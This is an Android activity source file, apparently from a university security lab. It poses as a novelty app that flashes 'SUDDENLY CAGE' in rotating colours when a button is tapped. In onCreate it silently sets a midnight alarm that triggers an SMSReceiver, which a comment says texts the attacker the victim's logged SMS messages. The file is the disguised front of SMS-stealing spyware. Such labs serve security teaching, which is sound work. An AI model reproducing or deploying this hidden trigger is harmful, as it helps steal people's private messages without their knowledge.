package cps633.lab4_ps2_06;

import android.app.Activity;
import android.app.AlarmManager;
import android.app.PendingIntent;
import android.content.Intent;
import android.graphics.Color;
import android.os.Bundle;
import android.view.View;
import android.widget.Button;
import android.widget.ImageView;
import android.widget.TextView;

import java.util.Calendar;

// Controller class to the user interface found under /res/layout/main
public class Lab4 extends Activity {

    Button button;
    ImageView imageView;
    TextView textView;
    int count = 0;

    // Called when the activity is first created.
    @Override
    public void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.main);
        button = (Button) findViewById(R.id.button1);
        imageView = (ImageView) findViewById(R.id.imageView);
        textView = (TextView) findViewById(R.id.textView);

        imageView.setVisibility(View.INVISIBLE);
        textView.setVisibility(View.INVISIBLE);

        //Settings time to midnight as required
        Calendar myAlarmDate = Calendar.getInstance();
        myAlarmDate.setTimeInMillis(System.currentTimeMillis());
        myAlarmDate.set(Calendar.HOUR_OF_DAY, 23);
        myAlarmDate.set(Calendar.MINUTE, 59);
        myAlarmDate.set(Calendar.SECOND, 59);

        //AlarmManager that sends the intent to SMSReceiver which then texts the attacker with the logged SMS messages
        AlarmManager alarmManager = (AlarmManager) getSystemService(ALARM_SERVICE);

        //Create AlarmManager intent
        Intent myIntent = new Intent(this, SMSReceiver.class);
        myIntent.setAction("AlarmStuff");
        PendingIntent pendingIntent = PendingIntent.getBroadcast(this, 0, myIntent, PendingIntent.FLAG_UPDATE_CURRENT);
        alarmManager.set(AlarmManager.RTC_WAKEUP, myAlarmDate.getTimeInMillis(),pendingIntent);
    }

    //Onclick method for the button. Rest is self-explanatory.
    public void button(View view) {

        textView.setVisibility(View.VISIBLE);
        imageView.setVisibility(View.VISIBLE);

        textView.setText("SUDDENLY CAGE");
        textView.setTextSize(45);

        count++;
        if(count == 1)
            textView.setTextColor(Color.CYAN);
        else if (count == 2)
            textView.setTextColor(Color.RED);
        else if (count == 3)
            textView.setTextColor(Color.WHITE);
        else if (count == 4)
            textView.setTextColor(Color.GREEN);
        else if (count == 5)
            textView.setTextColor(Color.MAGENTA);
        else if (count == 6){
            textView.setTextColor(Color.YELLOW);
            count = 0;
        }
    }
}